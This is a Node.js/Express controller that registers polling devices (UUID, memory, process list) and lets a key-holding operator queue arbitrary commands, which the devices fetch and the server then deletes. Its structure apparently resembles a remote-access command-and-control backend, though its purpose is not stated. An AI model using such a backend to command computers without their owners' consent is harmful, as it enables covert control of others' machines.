import { Device,CMD,Acount } from '../models/device/Device.js';
import { devKey } from '../../config/db.js';

// 1. GET: Fetch all devices registered in MongoDB
export const CmdTargetDevice = async (req, res) => {
    try {

      let UUID=req.query.UUID.substring(40,76);
        const exist=await Device.findOne({UUID:UUID})
        if(exist)
        {const cmds=await CMD.find({Device:exist._id})
        if(cmds)
        {
            const userCopy = Object.assign([], cmds);
            console.log(userCopy)
          const result = await CMD.deleteMany({Device:exist._id});
            return res.status(200).json({ cmds: userCopy});
        }
        else
        {
         return res.status(500).json({cmds:{_id:"",cmd:"Idle",Args:""}});
        }
        }
       
     //   const devices = await Device.find({});
       
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
};
export const incomingCmdToHost = async (req, res) => {
    try {
        

   
        if(req.query.devKey != devKey)
        {
            return res.status(400).json({ success: false, error: "Invaild User" }); 
        }
        const cmds=await CMD.create({
            Device:req.body.Device_id,
            cmd:req.body.cmd,
            Args:req.body.Args
        });

        if(cmds)
        {
            console.log("Cmd create");
        }


     //   const devices = await Device.find({});
        return res.status(200).json({ success: true, error: "Cmd Submit to server" });
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
};

// 2. POST: Register a new device into MongoDB
export const InComingDeviceData = async (req, res) => {
    try {
      //  console.log("pop",req.body);

        let UUID=req.body.UUID.substring(40,76);

        // // Save directly to the database using our Mongoose model
        const exist=await Device.findOne({UUID:UUID})
        if(!exist)
        {
            const create=await Device.create(
                {
                    name:req.body.name,
                    totalMemory:req.body.totalMemory,
                    Process:req.body.Process,
                    UUID:UUID
                }
            );
            if(create)
            {
                console.log("New Device Fetch !");
            }
        }
        else
        {
             exist.name=req.body.name;
             exist.totalMemory=req.body.totalMemory;
             exist.Process=req.body.Process;
            
            await exist.save();
           console.log("Save");
        }


        return res.status(201).json({ });
    } catch (error) {
        // Captures Mongoose schema validation errors automatically
        return res.status(400).json({ success: false, error: error.message });
    }
};

export const getAllDevice=async (req,res)=>{
 try {


        if(req.query.devKey != devKey)
        {
            return res.status(400).json({ success: false, error: "Invaild User" }); 
        }



        // // Save directly to the database using our Mongoose model
        const exist=await Device.find({});
        if(!exist)
        {
           return res.status(400).json({ success: false, error: "device not avalable" });
        }
   


        return res.status(201).json(exist);
    } catch (error) {
        // Captures Mongoose schema validation errors automatically
        return res.status(400).json({ success: false, error: error.message });
    }
}